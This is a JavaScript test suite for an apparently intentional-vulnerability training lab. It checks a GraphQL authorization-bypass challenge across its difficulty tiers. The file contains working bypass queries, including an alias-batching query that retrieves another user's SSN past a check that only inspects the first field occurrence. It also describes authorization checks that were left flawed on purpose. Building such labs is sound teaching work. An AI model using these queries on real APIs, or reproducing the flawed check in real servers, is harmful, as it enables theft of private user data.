/**
 * tests/graphql-expert-tier.test.js — Phase 7 addition: genuine
 * Expert-tier content for graphql-authz-bypass. Fifth lab with real
 * Expert content, after ssrf, jwt-vulnerabilities, sql-injection, xxe.
 *
 * The technique: hard tier's 3 holes (user/userProfile/node all lacking
 * or inconsistently applying ownership checks) are ALL closed at expert —
 * verified explicitly, not assumed — via one centralized pre-execution
 * check. That check only inspects the FIRST guarded field occurrence in
 * the document, so a second, differently-aliased occurrence with a
 * different id bypasses it entirely — a real, documented GraphQL
 * batching/aliasing authorization bypass class.
 *
 * Also verifies expert doesn't silently regress introspection blocking or
 * the sensitive-field AST check — both of those functions previously
 * special-cased "hard" only, and needed updating alongside this work; a
 * regression there would have been very easy to miss without an explicit
 * test for it.
 */
const http = require("http");

let pass = 0, fail = 0;
function check(name, cond, extra) { if (cond) { pass++; console.log("PASS:", name); } else { fail++; console.log("FAIL:", name, extra || ""); } }
setTimeout(() => { console.log(`DEADLINE HIT: ${pass} passed, ${fail} failed (incomplete)`); process.exit(2); }, 30000).unref();

function req(method, urlPath, { cookies, body } = {}) {
  return new Promise((resolve, reject) => {
    const data = body ? JSON.stringify(body) : null;
    const headers = {};
    if (cookies) headers.Cookie = cookies;
    if (data) { headers["Content-Type"] = "application/json"; headers["Content-Length"] = Buffer.byteLength(data); }
    const r = http.request({ host: "localhost", port: 3000, path: urlPath, method, headers }, (res) => {
      let out = "";
      res.on("data", (d) => (out += d));
      res.on("end", () => resolve({ status: res.statusCode, body: out, json: () => JSON.parse(out), setCookies: res.headers["set-cookie"] || [] }));
    });
    r.on("error", reject);
    if (data) r.write(data);
    r.end();
  });
}
function extractCookie(setCookies, name) {
  const line = setCookies.find((c) => c.startsWith(name + "="));
  return line ? line.split(";")[0] : null;
}
function gql(query, difficulty, cookies) {
  return req("POST", `/graphql?difficulty=${difficulty}`, { cookies, body: { query } });
}

async function run() {
  const rInit = await req("GET", "/vuln/graphql-authz-bypass?difficulty=expert");
  check("the guard lets expert through for the graphql-authz-bypass landing page", rInit.status === 200);
  const cookies = extractCookie(rInit.setCookies, "sid");

  const meResult = await gql("{ me { id } }", "expert", cookies);
  const myId = meResult.json().data.me.id;
  check("a session-bound identity is established via me { id }", typeof myId === "number");

  // --- expert closes ALL 3 of hard tier's holes ---------------------------
  const rUser = await gql("{ user(id: 100) { ssn } }", "expert", cookies);
  check("expert: a single non-owned user(id) lookup is blocked", rUser.json().data === undefined || rUser.json().data.user === null, JSON.stringify(rUser.json()));
  check("expert: the block gives a clear object-level-authorization reason", /Object-level authorization/i.test(rUser.body));

  const rUserProfile = await gql("{ userProfile(id: 100) { ssn } }", "expert", cookies);
  check("expert: userProfile(id) — hard tier's own fix — is also covered by the centralized check", /Object-level authorization/i.test(rUserProfile.body));

  const rNode = await gql("{ node(id: 100) { ssn } }", "expert", cookies);
  check("expert: node(id) — hard tier's OWN unfixed hole — is now closed too", /Object-level authorization/i.test(rNode.body));

  // --- regressions that would have been easy to introduce accidentally ---
  const rIntrospection = await gql("{ __schema { types { name } } }", "expert", cookies);
  check("expert: introspection is still blocked (didn't regress from hard tier's real rule)", /introspection has been disabled/i.test(rIntrospection.body));

  const rFieldFilter = await gql("{ users { ssn } }", "expert", cookies);
  check("expert: direct sensitive-field selection on users() is still blocked (didn't regress from hard tier's AST check)", /sensitive fields are not permitted/i.test(rFieldFilter.body));

  // --- the actual expert-tier exploit: alias-based batching ---------------
  const rExploit = await gql(`{ a: user(id: ${myId}) { username } b: user(id: 100) { ssn } }`, "expert", cookies);
  const exploitJson = rExploit.json();
  check("expert: the FIRST aliased occurrence (own id) succeeds normally", exploitJson.data && exploitJson.data.a && typeof exploitJson.data.a.username === "string");
  check("expert: the SECOND aliased occurrence (victim id) bypasses the check entirely", exploitJson.data && exploitJson.data.b && exploitJson.data.b.ssn === "000-00-0000", JSON.stringify(exploitJson));
  const flag = exploitJson.extensions && exploitJson.extensions.flags && exploitJson.extensions.flags["graphql-authz-bypass"];
  check("expert: a real, correctly-tiered flag is issued", !!flag && /^FLAG\{graphql-authz-bypass-expert-/.test(flag));

  // --- reversing the alias order still works (the FIRST one is what's checked, not the "user" field specifically) ---
  const cookies2 = extractCookie((await req("GET", "/vuln/graphql-authz-bypass?difficulty=expert")).setCookies, "sid");
  const myId2 = (await gql("{ me { id } }", "expert", cookies2)).json().data.me.id;
  const rReversed = await gql(`{ b: user(id: 100) { ssn } a: user(id: ${myId2}) { username } }`, "expert", cookies2);
  check("expert: when the VICTIM lookup is aliased first instead, the check correctly blocks it (proves it's really checking 'first occurrence', not just 'ignores anything named b')", /Object-level authorization/i.test(rReversed.body));

  // --- confirm the other 3 tiers are completely unchanged ------------------
  const rEasy = await gql("{ user(id: 100) { ssn } }", "easy");
  check("easy tier: BOLA still works exactly as before", /FLAG\{graphql-authz-bypass-easy-/.test(rEasy.body));

  const rHardUserProfile = await gql("{ userProfile(id: 100) { ssn } }", "hard");
  check("hard tier: userProfile(id) still blocked exactly as before", rHardUserProfile.json().data.userProfile === null);

  const rHardNode = await gql("{ node(id: 100) { ssn } }", "hard");
  check("hard tier: node(id) bypass still works exactly as before (unchanged by expert's fix)", /FLAG\{graphql-authz-bypass-hard-/.test(rHardNode.body));

  console.log(`\n=== ${pass} passed, ${fail} failed ===`);
  process.exit(fail > 0 ? 1 : 0);
}

run().catch((e) => { console.error("ERROR:", e.message); process.exit(1); });
